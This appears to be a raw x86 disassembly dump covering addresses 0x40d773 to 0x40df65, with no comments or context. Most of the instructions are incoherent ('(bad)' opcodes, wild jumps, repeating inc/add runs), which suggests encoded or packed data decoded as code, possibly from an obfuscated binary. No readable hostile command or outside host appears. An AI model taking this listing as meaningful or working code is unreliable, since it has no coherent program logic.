  40d773:	bound  eax,QWORD PTR [eax-0x7c]
  40d776:	inc    eax
  40d777:	inc    ecx
  40d778:	add    BYTE PTR [esi],cl
  40d77a:	in     eax,0xab
  40d77c:	xchg   BYTE PTR [edx-0x18],dl
  40d77f:	in     al,0x4
  40d781:	inc    eax
  40d782:	dec    esp
  40d783:	mov    ah,0x70
  40d785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d786:	bound  eax,QWORD PTR [eax-0x2e]
  40d789:	or     DWORD PTR [eax-0x57830261],ebp
  40d78f:	xor    edx,ebx
  40d791:	sub    BYTE PTR [edi+edi*1],0x41
  40d795:	inc    eax
  40d796:	inc    eax
  40d797:	inc    ebx
  40d798:	int3   
  40d799:	add    BYTE PTR ds:0x56240,al
  40d79f:	inc    ebx
  40d7a0:	inc    eax
  40d7a1:	inc    eax
  40d7a2:	add    BYTE PTR [ecx+0x62],al
  40d7a5:	bound  eax,QWORD PTR [eax]
  40d7a7:	int3   
  40d7a8:	inc    eax
  40d7a9:	inc    ebx
  40d7aa:	add    eax,0x43624041
  40d7af:	adc    BYTE PTR [ecx+0x5],al
  40d7b2:	inc    eax
  40d7b3:	add    eax,0x206cc36b
  40d7b8:	mov    al,ds:0x7a86445d
  40d7bd:	mov    esp,0xa10d4e47
  40d7c2:	cld    
  40d7c3:	outs   dx,BYTE PTR ds:[esi]
  40d7c4:	mov    al,0x77
  40d7c6:	inc    ebx
  40d7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7c8:	inc    eax
  40d7c9:	(bad)  
  40d7ca:	push   0xfffffffc
  40d7cc:	bound  esi,QWORD PTR [edi+0x271fdfd1]
  40d7d2:	push   ebp
  40d7d3:	add    eax,0x4043627c
  40d7d8:	adc    BYTE PTR ds:0x4158cc40,al
  40d7de:	inc    ebx
  40d7df:	bound  eax,QWORD PTR [ecx+0x40]
  40d7e2:	add    eax,0x4140
  40d7e7:	and    eax,0x40400062
  40d7ec:	add    eax,0x84404340
  40d7f1:	int3   
  40d7f2:	js     0x40d7f4
  40d7f4:	inc    ecx
  40d7f5:	adc    BYTE PTR [edx+0xf],ah
  40d7f8:	push   ebx
  40d7f9:	adc    al,0x14
  40d7fb:	inc    ecx
  40d7fc:	mov    ebx,0xbc9886dc
  40d801:	pop    eax
  40d802:	and    BYTE PTR [eax+0x2f],0x10
  40d806:	jne    0x40d854
  40d808:	retf   0x1e9c
  40d80b:	push   ecx
  40d80c:	imul   ecx,DWORD PTR [ebx+edi*8-0x23],0x3aae4fd
  40d814:	xor    DWORD PTR [edi+0x5],eax
  40d817:	std    
  40d818:	arpl   WORD PTR [ecx+0x26],ax
  40d81b:	frstor [ecx+0x48838650]
  40d821:	inc    ebx
  40d822:	clc    
  40d823:	mov    al,ds:0x6f0545
  40d828:	inc    eax
  40d829:	inc    ecx
  40d82a:	inc    eax
  40d82b:	inc    ebx
  40d82c:	bound  ax,DWORD PTR ds:0x40434100
  40d833:	add    eax,0x40054062
  40d838:	bound  eax,QWORD PTR [ecx+0x40]
  40d83b:	inc    ebx
  40d83c:	inc    eax
  40d83d:	add    eax,0x25405841
  40d842:	bound  eax,QWORD PTR [eax+0x43]
  40d845:	inc    eax
  40d846:	adc    BYTE PTR ds:0x1613300d,bl
  40d84c:	popa   
  40d84d:	inc    ecx
  40d84e:	cli    
  40d84f:	push   esp
  40d850:	retf   
  40d851:	loopne 0x40d813
  40d853:	cmp    DWORD PTR [eax],0x4da058d
  40d859:	inc    eax
  40d85a:	mov    eax,ds:0x8675e3e0
  40d85f:	xlat   BYTE PTR ds:[ebx]
  40d860:	xor    al,0x31
  40d862:	ins    DWORD PTR es:[edi],dx
  40d863:	add    eax,0x5634656f
  40d868:	inc    eax
  40d869:	inc    ecx
  40d86a:	inc    ebx
  40d86b:	inc    eax
  40d86c:	add    eax,0x43406262
  40d871:	inc    ecx
  40d872:	adc    BYTE PTR [eax],al
  40d874:	inc    eax
  40d875:	add    eax,0x43000562
  40d87a:	add    BYTE PTR [ecx+0x40],al
  40d87d:	inc    eax
  40d87e:	add    eax,0x400062
  40d883:	inc    ebx
  40d884:	inc    eax
  40d885:	js     0x40d8c8
  40d887:	inc    ecx
  40d888:	bound  eax,QWORD PTR [eax+0x42]
  40d88b:	ins    BYTE PTR es:[edi],dx
  40d88c:	adc    eax,0xf935e107
  40d891:	test   al,0x62
  40d893:	bound  esp,QWORD PTR fs:[eax-0x1faacac]
  40d89a:	dec    eax
  40d89b:	inc    edi
  40d89c:	cmp    al,0x65
  40d89e:	loopne 0x40d820
  40d8a0:	xchg   BYTE PTR [esi+0x6768c565],ah
  40d8a6:	daa    
  40d8a7:	add    DWORD PTR [esi],ebp
  40d8a9:	fs (bad) 
  40d8ab:	lock add eax,0xf87e2b20
  40d8b1:	xor    edx,eax
  40d8b3:	stos   DWORD PTR es:[edi],eax
  40d8b4:	scas   eax,DWORD PTR es:[edi]
  40d8b5:	adc    eax,0xf405dda1
  40d8ba:	bound  eax,QWORD PTR [eax+0x5]
  40d8bd:	inc    ecx
  40d8be:	add    BYTE PTR [ebx+0x40],al
  40d8c1:	inc    eax
  40d8c2:	inc    ecx
  40d8c3:	inc    eax
  40d8c4:	inc    eax
  40d8c5:	bound  eax,QWORD PTR ds:0x5624300
  40d8cb:	add    BYTE PTR [eax+0x40],al
  40d8ce:	add    BYTE PTR [ecx+0x43],al
  40d8d1:	add    BYTE PTR [eax+0x41],al
  40d8d4:	add    eax,0x40436200
  40d8d9:	inc    eax
  40d8da:	add    eax,0x50990e62
  40d8df:	jno    0x40d89e
  40d8e1:	inc    edx
  40d8e2:	xchg   BYTE PTR [edx+0x4],ah
  40d8e5:	sub    BYTE PTR [esi+0x65],0xf5
  40d8e9:	jecxz  0x40d910
  40d8eb:	adc    eax,esi
  40d8ed:	inc    ecx
  40d8ee:	nop
  40d8ef:	and    ah,bl
  40d8f1:	cmc    
  40d8f2:	neg    DWORD PTR [edx+edx*8-0x85bdb9]
  40d8f9:	bound  eax,QWORD PTR ds:0x252419ed
  40d8ff:	push   edx
  40d900:	sub    DWORD PTR [esi+eax*4+0x65],ecx
  40d904:	jnp    0x40d8e2
  40d906:	jl     0x40d8f1
  40d908:	pushf  
  40d909:	push   ds
  40d90a:	and    al,0x9b
  40d90c:	fld    QWORD PTR [eax-0x39]
  40d90f:	loope  0x40d936
  40d911:	xor    DWORD PTR [ecx+0x40],eax
  40d914:	add    eax,0x41624340
  40d919:	test   BYTE PTR [eax],al
  40d91b:	and    eax,0x404043
  40d920:	add    BYTE PTR ds:0x626210,al
  40d926:	add    eax,0x43404140
  40d92b:	inc    eax
  40d92c:	inc    ecx
  40d92d:	add    eax,0x10664062
  40d932:	inc    ebx
  40d933:	(bad)  
  40d934:	neg    ah
  40d936:	mov    edi,0x4229ae31
  40d93b:	mov    al,0x5
  40d93d:	push   edi
  40d93e:	mov    edi,0xa0824a6c
  40d943:	or     eax,0x1bf7486
  40d948:	or     al,BYTE PTR ds:0x4041cc
  40d94e:	add    BYTE PTR [eax],al
  40d950:	inc    eax
  40d951:	inc    eax
  40d952:	inc    ebx
  40d953:	bound  eax,QWORD PTR [eax]
  40d955:	inc    eax
  40d956:	inc    eax
  40d957:	add    eax,0x62434162
  40d95c:	inc    eax
  40d95d:	js     0x40d96f
  40d95f:	inc    ecx
  40d960:	add    eax,0x5404325
  40d965:	bound  eax,QWORD PTR [eax+0x40]
  40d968:	inc    ecx
  40d969:	inc    ebx
  40d96a:	and    al,0x7
  40d96c:	adc    DWORD PTR [ecx],ebp
  40d96e:	imul   edi,DWORD PTR [edi-0x36d6adf3],0x4103f572
  40d978:	jmp    0x62631d15
  40d97d:	add    eax,0x4354478c
  40d982:	mov    ds:0x57865025,eax
  40d987:	cmp    al,0xba
  40d989:	add    eax,0x3232301d
  40d98e:	pop    esi
  40d98f:	addr16 pusha 
  40d991:	and    DWORD PTR gs:[bx+di-0x370c],eax
  40d997:	inc    eax
  40d998:	sub    al,dl
  40d99a:	gs mov ch,0x25
  40d99d:	inc    ecx
  40d99e:	bound  eax,QWORD PTR [ebx+0x0]
  40d9a1:	adc    BYTE PTR [eax+0x0],al
  40d9a4:	add    eax,0x62410040
  40d9a9:	inc    eax
  40d9aa:	add    BYTE PTR [ebx-0x34],al
  40d9ad:	inc    eax
  40d9ae:	add    eax,0x78434040
  40d9b3:	bound  eax,QWORD PTR [ecx+0x78]
  40d9b6:	add    eax,0x62404043
  40d9bb:	add    ax,0x5c85
  40d9bf:	inc    ecx
  40d9c0:	out    0x54,eax
  40d9c2:	dec    ebp
  40d9c3:	push   esp
  40d9c4:	xchg   cl,bh
  40d9c6:	outs   dx,DWORD PTR ds:[esi]
  40d9c7:	add    eax,0x69e12baa
  40d9cc:	adc    al,0xa8
  40d9ce:	pop    ecx
  40d9cf:	push   eax
  40d9d0:	or     esi,DWORD PTR [esi-0x3e]
  40d9d3:	aad    0xf3
  40d9d5:	add    BYTE PTR [eax-0x1cdb309e],bh
  40d9db:	es add eax,0x17406417
  40d9e1:	sub    DWORD PTR [ecx+0x40],eax
  40d9e4:	add    eax,0x43436240
  40d9e9:	add    eax,0x62004040
  40d9ee:	inc    eax
  40d9ef:	add    BYTE PTR [ecx+0x40],al
  40d9f2:	inc    ebx
  40d9f3:	test   BYTE PTR ds:0x58054041,ah
  40d9f9:	inc    eax
  40d9fa:	inc    eax
  40d9fb:	bound  eax,QWORD PTR [eax+0x66]
  40d9fe:	inc    ecx
  40d9ff:	inc    eax
  40da00:	add    eax,0x8651ff00
  40da05:	bound  ebx,QWORD PTR [eax]
  40da07:	xor    BYTE PTR [esi],ch
  40da09:	sbb    esp,DWORD PTR [ecx+0x65736039]
  40da0f:	ins    BYTE PTR es:[edi],dx
  40da10:	leave  
  40da11:	sub    esp,DWORD PTR ds:0x35d4f2b8
  40da17:	push   ds
  40da18:	jmp    0xa63b69
  40da1d:	add    BYTE PTR [ebx+0x40],al
  40da20:	bound  eax,QWORD PTR ds:0x25404110
  40da26:	add    ah,cl
  40da28:	inc    ebx
  40da29:	add    eax,0x40402562
  40da2e:	add    BYTE PTR [eax+0x40],al
  40da31:	inc    ecx
  40da32:	inc    ecx
  40da33:	add    eax,0x78434025
  40da38:	bound  eax,QWORD PTR [eax-0x7c]
  40da3b:	inc    eax
  40da3c:	inc    ecx
  40da3d:	add    eax,0x49432455
  40da42:	gs sub ebp,esp
  40da45:	xchg   BYTE PTR [ecx+0x44],al
  40da48:	rcl    DWORD PTR [ecx],1
  40da4a:	adc    dh,BYTE PTR [ebx+0x20c97b0a]
  40da50:	xlat   BYTE PTR ds:[ebx]
  40da51:	shr    ebx,1
  40da53:	and    edi,DWORD PTR [ecx+esi*8]
  40da56:	pop    eax
  40da57:	gs xchg esp,eax
  40da59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da5a:	xor    esp,ebp
  40da5c:	imul   eax,DWORD PTR ds:0x6ab160d,0x65
  40da63:	xchg   ah,bl
  40da65:	xchg   BYTE PTR [ecx+0x31],al
  40da68:	inc    edx
  40da69:	es scas eax,DWORD PTR es:[edi]
  40da6b:	out    0x62,eax
  40da6d:	jno    0x40dab8
  40da6f:	bound  eax,QWORD PTR [ecx-0x6c]
  40da72:	mov    al,ds:0x404041c1
  40da77:	inc    ebx
  40da78:	int3   
  40da79:	add    BYTE PTR ds:0x56240,al
  40da7f:	inc    ebx
  40da80:	inc    eax
  40da81:	inc    eax
  40da82:	add    BYTE PTR [ecx+0x62],al
  40da85:	bound  eax,QWORD PTR [eax]
  40da87:	int3   
  40da88:	inc    eax
  40da89:	inc    ebx
  40da8a:	add    eax,0x43624041
  40da8f:	adc    BYTE PTR [ecx+0x5],al
  40da92:	inc    eax
  40da93:	pop    ds
  40da94:	lock mov WORD PTR [ebx],es
  40da97:	inc    ebx
  40da98:	sub    al,0x26
  40da9a:	icebp  
  40da9b:	add    BYTE PTR ds:0xdd30c0c1,0x2a
  40daa2:	mov    edi,0x66a8866f
  40daa7:	aam    0x36
  40daa9:	inc    eax
  40daaa:	retf   0x6e98
  40daad:	loope  0x40db03
  40daaf:	inc    eax
  40dab0:	bound  esp,QWORD PTR [ecx]
  40dab2:	jns    0x40dacd
  40dab4:	out    dx,eax
  40dab5:	ss xor eax,0xc050c931
  40dabb:	xor    al,0x5
  40dabd:	(bad)  
  40dabe:	jns    0x40db2c
  40dac0:	push   ecx
  40dac1:	bound  eax,QWORD PTR [ebx+0x40]
  40dac4:	adc    BYTE PTR ds:0x4158cc40,al
  40daca:	inc    ebx
  40dacb:	bound  eax,QWORD PTR [ecx+0x40]
  40dace:	add    eax,0x4140
  40dad3:	and    eax,0x40400062
  40dad8:	add    eax,0x84404340
  40dadd:	int3   
  40dade:	js     0x40dae0
  40dae0:	inc    ecx
  40dae1:	adc    BYTE PTR [edx+0xf],ah
  40dae4:	loopne 0x40dacf
  40dae6:	jmp    0x3c1fc771
  40daeb:	mov    cl,0x21
  40daed:	rcr    dl,0x76
  40daf0:	push   esp
  40daf1:	push   ebx
  40daf2:	inc    ebx
  40daf3:	dec    esp
  40daf4:	push   ecx
  40daf5:	jmp    DWORD PTR [esi-0x12]
  40daf8:	inc    eax
  40daf9:	push   ecx
  40dafa:	sar    DWORD PTR [esi+0x414000a2],1
  40db00:	inc    eax
  40db01:	inc    ebx
  40db02:	bound  ax,DWORD PTR ds:0x40434100
  40db09:	add    eax,0x40054062
  40db0e:	bound  eax,QWORD PTR [ecx+0x40]
  40db11:	inc    ebx
  40db12:	inc    eax
  40db13:	add    eax,0x25405841
  40db18:	bound  eax,QWORD PTR [eax+0x43]
  40db1b:	inc    eax
  40db1c:	adc    ah,al
  40db1e:	mov    ds:0xe5f01005,al
  40db23:	stos   DWORD PTR es:[edi],eax
  40db24:	sub    al,0x35
  40db26:	test   al,0x86
  40db28:	imul   esp,DWORD PTR [edi-0x7e],0xffffffbe
  40db2c:	retf   0x41c4
  40db2f:	pusha  
  40db30:	dec    edx
  40db31:	inc    esi
  40db32:	fld    DWORD PTR [eax+0x41]
  40db35:	inc    ebx
  40db36:	inc    eax
  40db37:	add    eax,0x43406262
  40db3c:	inc    ecx
  40db3d:	adc    BYTE PTR [eax],al
  40db3f:	inc    eax
  40db40:	add    eax,0x43000562
  40db45:	add    BYTE PTR [ecx+0x40],al
  40db48:	inc    eax
  40db49:	add    eax,0x400062
  40db4e:	inc    ebx
  40db4f:	inc    eax
  40db50:	js     0x40db93
  40db52:	inc    ecx
  40db53:	bound  eax,QWORD PTR [eax+0x71]
  40db56:	inc    ecx
  40db57:	aas    
  40db58:	sub    ch,ch
  40db5a:	test   al,0x28
  40db5c:	pop    ebx
  40db5d:	frstor [ecx+0x110541c5]
  40db63:	push   es
  40db64:	inc    ecx
  40db65:	cmp    al,0x63
  40db67:	xor    edi,DWORD PTR ds:0x4062bc86
  40db6d:	add    eax,0x40430041
  40db72:	inc    eax
  40db73:	inc    ecx
  40db74:	inc    eax
  40db75:	inc    eax
  40db76:	bound  eax,QWORD PTR ds:0x5624300
  40db7c:	add    BYTE PTR [eax+0x40],al
  40db7f:	add    BYTE PTR [ecx+0x43],al
  40db82:	add    BYTE PTR [eax+0x41],al
  40db85:	add    eax,0x40436200
  40db8a:	inc    eax
  40db8b:	add    eax,0x2843a862
  40db90:	and    DWORD PTR [edi],edi
  40db92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db93:	adc    al,0x41
  40db95:	adc    BYTE PTR [eax],dh
  40db97:	ror    BYTE PTR [ebp+0x63],cl
  40db9a:	push   es
  40db9b:	in     al,dx
  40db9c:	into   
  40db9d:	mov    esp,0x42615fd0
  40dba2:	cwde   
  40dba3:	add    eax,0xca4041e4
  40dba8:	mov    WORD PTR [ecx],fs
  40dbaa:	dec    edi
  40dbab:	xchg   BYTE PTR [ecx-0x33],al
  40dbae:	xor    eax,edx
  40dbb0:	jecxz  0x40db71
  40dbb2:	int3   
  40dbb3:	push   cs
  40dbb4:	dec    eax
  40dbb5:	mov    al,0x6c
  40dbb7:	jmp    0x40dc03
  40dbb9:	push   edi
  40dbba:	shr    bl,0x69
  40dbbd:	mov    eax,ds
  40dbbf:	jmp    0x5cd1526
  40dbc4:	pop    edi
  40dbc5:	inc    ecx
  40dbc6:	inc    eax
  40dbc7:	add    eax,0x41624340
  40dbcc:	test   BYTE PTR [eax],al
  40dbce:	and    eax,0x404043
  40dbd3:	add    BYTE PTR ds:0x626210,al
  40dbd9:	add    eax,0x43404140
  40dbde:	inc    eax
  40dbdf:	inc    ecx
  40dbe0:	add    eax,0x10664062
  40dbe5:	inc    ebx
  40dbe6:	bound  edx,QWORD PTR [ecx+0x4a]
  40dbe9:	scas   eax,DWORD PTR es:[edi]
  40dbea:	daa    
  40dbeb:	dec    eax
  40dbec:	xchg   BYTE PTR fs:[eax+0x454cd9f1],ch
  40dbf3:	in     eax,dx
  40dbf4:	test   eax,0x8f6d1160
  40dbf9:	popa   
  40dbfa:	mov    al,ds:0xbceab457
  40dbff:	inc    ebx
  40dc00:	hlt    
  40dc01:	aam    0x30
  40dc03:	xor    esp,DWORD PTR ds:0xae2a0d05
  40dc09:	fdivr  DWORD PTR [edx+0x42866257]
  40dc0f:	inc    ecx
  40dc10:	push   edi
  40dc11:	add    eax,0x4041cc
  40dc16:	add    BYTE PTR [eax],al
  40dc18:	inc    eax
  40dc19:	inc    eax
  40dc1a:	inc    ebx
  40dc1b:	bound  eax,QWORD PTR [eax]
  40dc1d:	inc    eax
  40dc1e:	inc    eax
  40dc1f:	add    eax,0x62434162
  40dc24:	inc    eax
  40dc25:	js     0x40dc37
  40dc27:	inc    ecx
  40dc28:	add    eax,0x5404325
  40dc2d:	bound  eax,QWORD PTR [eax+0x40]
  40dc30:	inc    ecx
  40dc31:	inc    ebx
  40dc32:	dec    ebx
  40dc33:	into   
  40dc34:	aas    
  40dc35:	inc    ecx
  40dc36:	xor    esp,DWORD PTR [ebp+0x2a]
  40dc39:	inc    ecx
  40dc3a:	push   ecx
  40dc3b:	jecxz  0x40dc8c
  40dc3d:	mov    esp,0x434188e9
  40dc42:	inc    edx
  40dc43:	push   ebx
  40dc44:	mov    eax,ds:0x13620568
  40dc49:	xor    ch,ah
  40dc4b:	mov    ds:0x74863840,eax
  40dc50:	and    al,0xcc
  40dc52:	jp     0x40dca9
  40dc54:	loop   0x40dc52
  40dc56:	aaa    
  40dc57:	sub    BYTE PTR [ecx+0x40],ch
  40dc5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc5b:	loope  0x40dc66
  40dc5d:	fs call 0x307264b9
  40dc63:	and    eax,0x43056764
  40dc68:	cmp    BYTE PTR ds:0x436241,ah
  40dc6e:	adc    BYTE PTR [eax+0x0],al
  40dc71:	add    eax,0x62410040
  40dc76:	inc    eax
  40dc77:	add    BYTE PTR [ebx-0x34],al
  40dc7a:	inc    eax
  40dc7b:	add    eax,0x78434040
  40dc80:	bound  eax,QWORD PTR [ecx+0x78]
  40dc83:	add    eax,0x62404043
  40dc88:	ins    BYTE PTR es:[edi],dx
  40dc89:	xchg   BYTE PTR [ecx+0x2386bca0],ah
  40dc8f:	sub    ch,dh
  40dc91:	mov    DWORD PTR [esi-0x43],eax
  40dc94:	std    
  40dc95:	das    
  40dc96:	mov    esi,0xa3c4a849
  40dc9b:	cmovl  esp,edi
  40dc9e:	add    ah,BYTE PTR [eax]
  40dca0:	adc    ch,BYTE PTR ds:0x5644e22
  40dca6:	add    al,0x39
  40dca8:	jbe    0x40dc6a
  40dcaa:	gs loop 0x40dcee
  40dcad:	xchg   bh,dh
  40dcaf:	test   al,0xf7
  40dcb1:	jns    0x40dcb5
  40dcb3:	push   edi
  40dcb4:	inc    ecx
  40dcb5:	inc    eax
  40dcb6:	add    eax,0x43436240
  40dcbb:	add    eax,0x62004040
  40dcc0:	inc    eax
  40dcc1:	add    BYTE PTR [ecx+0x40],al
  40dcc4:	inc    ebx
  40dcc5:	test   BYTE PTR ds:0x58054041,ah
  40dccb:	inc    eax
  40dccc:	inc    eax
  40dccd:	bound  eax,QWORD PTR [eax+0x66]
  40dcd0:	inc    ecx
  40dcd1:	inc    eax
  40dcd2:	add    eax,0x4f248c00
  40dcd7:	adc    ah,BYTE PTR [edx+0x73]
  40dcda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcdb:	aas    
  40dcdc:	call   0x2605:0x6a4bce6
  40dce3:	jae    0x40dd37
  40dce5:	add    eax,0xbf164115
  40dcea:	mov    al,ds:0xcb863157
  40dcef:	cmp    BYTE PTR [esi],bh
  40dcf1:	icebp  
  40dcf2:	mov    edi,0x452e5139
  40dcf7:	call   0x576e1f3f
  40dcfc:	loopne 0x40dce3
  40dcfe:	sbb    BYTE PTR [eax],al
  40dd00:	add    BYTE PTR [ebx+0x40],al
  40dd03:	bound  eax,QWORD PTR ds:0x25404110
  40dd09:	add    ah,cl
  40dd0b:	inc    ebx
  40dd0c:	add    eax,0x40402562
  40dd11:	add    BYTE PTR [eax+0x40],al
  40dd14:	inc    ecx
  40dd15:	inc    ecx
  40dd16:	add    eax,0x78434025
  40dd1b:	bound  eax,QWORD PTR [eax-0x7c]
  40dd1e:	inc    eax
  40dd1f:	inc    ecx
  40dd20:	adc    esi,DWORD PTR [ebx]
  40dd22:	jp     0x40dda2
  40dd24:	aas    
  40dd25:	add    al,0x5
  40dd27:	sbb    BYTE PTR [eax+0x48ab53c8],al
  40dd2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd2e:	xchg   BYTE PTR [ebx+0x67],ah
  40dd31:	inc    eax
  40dd32:	adc    DWORD PTR [ebx-0x13],edx
  40dd35:	push   edx
  40dd36:	sub    DWORD PTR [ebx-0x30],ecx
  40dd39:	xor    DWORD PTR [ebx-0x60],esp
  40dd3c:	push   esi
  40dd3d:	xor    ah,ah
  40dd3f:	lea    esp,[ebx+0x6c]
  40dd42:	fnstenv ds:0x4405d1f3
  40dd48:	add    eax,0x2f215692
  40dd4d:	xor    al,0x86
  40dd4f:	rol    BYTE PTR [edi+0x56235e4d],cl
  40dd55:	pop    eax
  40dd56:	pop    ss
  40dd57:	inc    ecx
  40dd58:	inc    eax
  40dd59:	inc    eax
  40dd5a:	inc    ebx
  40dd5b:	int3   
  40dd5c:	add    BYTE PTR ds:0x56240,al
  40dd62:	inc    ebx
  40dd63:	inc    eax
  40dd64:	inc    eax
  40dd65:	add    BYTE PTR [ecx+0x62],al
  40dd68:	bound  eax,QWORD PTR [eax]
  40dd6a:	int3   
  40dd6b:	inc    eax
  40dd6c:	inc    ebx
  40dd6d:	add    eax,0x43624041
  40dd72:	adc    BYTE PTR [ecx+0x5],al
  40dd75:	inc    eax
  40dd76:	outs   dx,DWORD PTR ds:[esi]
  40dd77:	xchg   esp,eax
  40dd78:	cmc    
  40dd79:	jne    0x40dd7c
  40dd7b:	call   DWORD PTR [ebx-0x1d]
  40dd7e:	xor    al,0xd
  40dd80:	pop    eax
  40dd81:	pop    esp
  40dd82:	mov    eax,ds:0x1c05d1e4
  40dd87:	leave  
  40dd88:	push   ds
  40dd89:	bound  eax,QWORD PTR [ebx+0x40]
  40dd8c:	adc    BYTE PTR ds:0x4158cc40,al
  40dd92:	inc    ebx
  40dd93:	bound  eax,QWORD PTR [ecx+0x40]
  40dd96:	add    eax,0x4140
  40dd9b:	and    eax,0x40400062
  40dda0:	add    eax,0x84404340
  40dda5:	int3   
  40dda6:	js     0x40dda8
  40dda8:	inc    ecx
  40dda9:	adc    BYTE PTR [edx+0xf],ah
  40ddac:	jb     0x40de2c
  40ddae:	and    BYTE PTR ds:0x7aacb886,dh
  40ddb4:	fisub  WORD PTR ds:0xc360a805
  40ddba:	or     eax,0x735aa543
  40ddbf:	add    BYTE PTR [eax+0x41],al
  40ddc2:	inc    eax
  40ddc3:	inc    ebx
  40ddc4:	bound  ax,DWORD PTR ds:0x40434100
  40ddcb:	add    eax,0x40054062
  40ddd0:	bound  eax,QWORD PTR [ecx+0x40]
  40ddd3:	inc    ebx
  40ddd4:	inc    eax
  40ddd5:	add    eax,0x25405841
  40ddda:	bound  eax,QWORD PTR [eax+0x43]
  40dddd:	inc    eax
  40ddde:	adc    BYTE PTR [edx-0x1e],al
  40dde1:	inc    edx
  40dde2:	inc    esp
  40dde3:	xor    edx,DWORD PTR [ebx+eiz*2-0x10fad5a0]
  40ddea:	jae    0x40ddb0
  40ddec:	mov    al,ds:0x8612722f
  40ddf1:	sub    al,0xd8
  40ddf3:	sar    DWORD PTR [esi+0x7bbc4177],0x62
  40ddfa:	cwde   
  40ddfb:	inc    esp
  40ddfc:	cli    
  40ddfd:	out    0xa0,eax
  40ddff:	inc    ebx
  40de00:	loope  0x40de4e
  40de02:	add    eax,0xfeee05a
  40de07:	xor    BYTE PTR ds:0x716a87ef,al
  40de0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de0e:	inc    eax
  40de0f:	sub    BYTE PTR [esi+0x40434140],al
  40de15:	add    eax,0x43406262
  40de1a:	inc    ecx
  40de1b:	adc    BYTE PTR [eax],al
  40de1d:	inc    eax
  40de1e:	add    eax,0x43000562
  40de23:	add    BYTE PTR [ecx+0x40],al
  40de26:	inc    eax
  40de27:	add    eax,0x400062
  40de2c:	inc    ebx
  40de2d:	inc    eax
  40de2e:	js     0x40de71
  40de30:	inc    ecx
  40de31:	bound  eax,QWORD PTR [eax+0x2d]
  40de34:	retf   0xa3b1
  40de37:	adc    BYTE PTR [edi+ebp*1-0x50389d90],0xbf
  40de3f:	mov    ds:0xfde02814,eax
  40de44:	jae    0x40de89
  40de46:	and    al,BYTE PTR [ecx+0x4d]
  40de49:	bound  eax,QWORD PTR ds:0x65d2f848
  40de4f:	and    DWORD PTR [edx-0x739d7994],esp
  40de55:	adc    cl,BYTE PTR [edx+0x70]
  40de58:	bound  eax,QWORD PTR [eax+0x5]
  40de5b:	inc    ecx
  40de5c:	add    BYTE PTR [ebx+0x40],al
  40de5f:	inc    eax
  40de60:	inc    ecx
  40de61:	inc    eax
  40de62:	inc    eax
  40de63:	bound  eax,QWORD PTR ds:0x5624300
  40de69:	add    BYTE PTR [eax+0x40],al
  40de6c:	add    BYTE PTR [ecx+0x43],al
  40de6f:	add    BYTE PTR [eax+0x41],al
  40de72:	add    eax,0x40436200
  40de77:	inc    eax
  40de78:	add    eax,0x6ea45562
  40de7d:	inc    edx
  40de7e:	add    eax,0xbf22a892
  40de83:	fs (bad) 
  40de86:	xchg   DWORD PTR [edx+0x0],ebx
  40de89:	es jb  0x40decf
  40de8c:	add    eax,0x40414f40
  40de91:	add    eax,0x41624340
  40de96:	test   BYTE PTR [eax],al
  40de98:	and    eax,0x404043
  40de9d:	add    BYTE PTR ds:0x626210,al
  40dea3:	add    eax,0x43404140
  40dea8:	inc    eax
  40dea9:	inc    ecx
  40deaa:	add    eax,0x10664062
  40deaf:	inc    ebx
  40deb0:	bound  esp,QWORD PTR [ecx-0x4d]
  40deb3:	or     eax,0x12862a55
  40deb8:	fwait
  40deb9:	inc    ecx
  40deba:	xchg   esi,eax
  40debb:	gs mov bh,0x77
  40debe:	jns    0x40df29
  40dec0:	push   edx
  40dec1:	ss pushf 
  40dec3:	adc    dl,BYTE PTR [edx+0x5]
  40dec6:	int3   
  40dec7:	inc    ecx
  40dec8:	inc    eax
  40dec9:	add    BYTE PTR [eax],al
  40decb:	add    BYTE PTR [eax+0x40],al
  40dece:	inc    ebx
  40decf:	bound  eax,QWORD PTR [eax]
  40ded1:	inc    eax
  40ded2:	inc    eax
  40ded3:	add    eax,0x62434162
  40ded8:	inc    eax
  40ded9:	js     0x40deeb
  40dedb:	inc    ecx
  40dedc:	add    eax,0x5404325
  40dee1:	bound  eax,QWORD PTR [eax+0x40]
  40dee4:	inc    ecx
  40dee5:	inc    ebx
  40dee6:	pop    eax
  40dee7:	fisub  WORD PTR [edx]
  40dee9:	addr16 xor al,0x94
  40deec:	stos   DWORD PTR es:[edi],eax
  40deed:	mov    cl,0x23
  40deef:	add    eax,0x23c0ec42
  40def4:	mov    ebx,0xd186e650
  40def9:	gs rcl eax,0x70
  40defd:	bound  ebp,QWORD PTR [eax+eiz*2+0x36]
  40df01:	and    eax,0x436241
  40df06:	adc    BYTE PTR [eax+0x0],al
  40df09:	add    eax,0x62410040
  40df0e:	inc    eax
  40df0f:	add    BYTE PTR [ebx-0x34],al
  40df12:	inc    eax
  40df13:	add    eax,0x78434040
  40df18:	bound  eax,QWORD PTR [ecx+0x78]
  40df1b:	add    eax,0x62404043
  40df20:	xchg   edx,eax
  40df21:	inc    eax
  40df22:	dec    edi
  40df23:	jecxz  0x40df94
  40df25:	arpl   bp,bx
  40df27:	dec    esp
  40df28:	jae    0x40df50
  40df2a:	fisttp QWORD PTR [eax+0x2e]
  40df2d:	and    eax,0x6bc96205
  40df32:	xor    al,0x62
  40df34:	push   gs
  40df36:	xchg   BYTE PTR [eax+0x5],al
  40df39:	dec    esp
  40df3a:	stos   BYTE PTR es:[edi],al
  40df3b:	cmp    BYTE PTR [edx+0x28300541],ah
  40df41:	inc    ebx
  40df42:	stos   DWORD PTR es:[edi],eax
  40df43:	inc    eax
  40df44:	and    DWORD PTR [edx],ebp
  40df46:	fsubr  QWORD PTR [ecx-0x4]
  40df49:	inc    ecx
  40df4a:	inc    eax
  40df4b:	add    eax,0x43436240
  40df50:	add    eax,0x62004040
  40df55:	inc    eax
  40df56:	add    BYTE PTR [ecx+0x40],al
  40df59:	inc    ebx
  40df5a:	test   BYTE PTR ds:0x58054041,ah
  40df60:	inc    eax
  40df61:	inc    eax
  40df62:	bound  eax,QWORD PTR [eax+0x66]
  40df65:	inc    ecx
